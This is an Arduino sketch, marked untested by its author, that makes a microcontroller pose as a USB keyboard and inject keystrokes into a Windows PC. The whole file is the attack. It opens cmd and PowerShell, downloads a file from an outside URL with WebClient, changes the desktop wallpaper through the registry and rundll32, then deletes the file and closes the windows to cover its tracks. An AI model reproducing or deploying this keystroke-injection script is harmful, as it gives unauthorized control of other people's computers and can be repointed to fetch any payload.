/* ----------
 * not tested
 * ---------- */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void esp_print(String text){
  for (int i = 0; i<=text.length(); i++)
  {
      char val = text[i];
      if (val == ':'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print(".");
        Keyboard.releaseAll();
      }else if (val == '/'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print("7");
        Keyboard.releaseAll();
      }else if (val == '('){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("8");
          Keyboard.releaseAll();
      }else if (val == ')'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("9");
          Keyboard.releaseAll();
      }else if (val == '='){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("0");
          Keyboard.releaseAll();
      }else if (val == ';'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print(",");
          Keyboard.releaseAll();
      }else if (val == '"'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("2");
          Keyboard.releaseAll();
      }else if (val == '-'){
          Keyboard.print("/");
      }else if (val == '&'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("6");
          Keyboard.releaseAll();
      }else if (val == '\\'){
          Keyboard.press(KEY_RIGHT_ALT);
          Keyboard.print("`");
          Keyboard.releaseAll();
      }else{
        Keyboard.print(val);
      }
  }
}

void opencmd(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("cmd");
  delay(400);
  typeKey(KEY_RETURN);
}

void changedir(String letter, String directory){
  esp_print(letter + " && cd / && cd "+directory);
  typeKey(KEY_RETURN);
}

void openpowershell(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  delay(100);
  typeKey(KEY_RETURN);
}

void changewallpaper(String letter, String directory, String imagename){
  esp_print("Set-ItemProperty -path \"HKCU:\\Control Panel\\Desktop\\\" -name wallpaper -value \""+letter+"\\"+directory+"\\"+imagename+"\"");
  typeKey(KEY_RETURN);
  delay(100);
  esp_print("rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True");
  typeKey(KEY_RETURN);
  delay(600);
}

void downloadimage(String letter, String directory, String imagename, String url){
  changedir(letter, directory);
  delay(500);
  Keyboard.print("powershell");
  typeKey(KEY_RETURN);
  delay(500);
  esp_print("$client = new-object System.Net.WebClient; $client.DownloadFile(\""+url+"\",\""+letter+"\\"+directory+"\\"+imagename+"\")");
  typeKey(KEY_RETURN);
}

void updatewallpaper(String letter, String directory, String imagename){
  for (int i = 0; i<=3; i++){
    changewallpaper(letter, directory, imagename);
  }

}

void clean(String letter, String directory, String imagename){
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("del "+imagename);
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
}

void setup(){
  // Begining the Keyboard stream
  Keyboard.begin();
  String letter = "C:";
  String directory = "Users\\Public";
  String imagename = "34gvq4g.jpg";
  String url = "http://oi67.tinypic.com/34gvq4g.jpg";
  delay(10000);
  opencmd();
  delay(1000);
  downloadimage(letter, directory, imagename, url);
  delay(5000);
  updatewallpaper(letter, directory, imagename);
  clean(letter, directory, imagename);
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
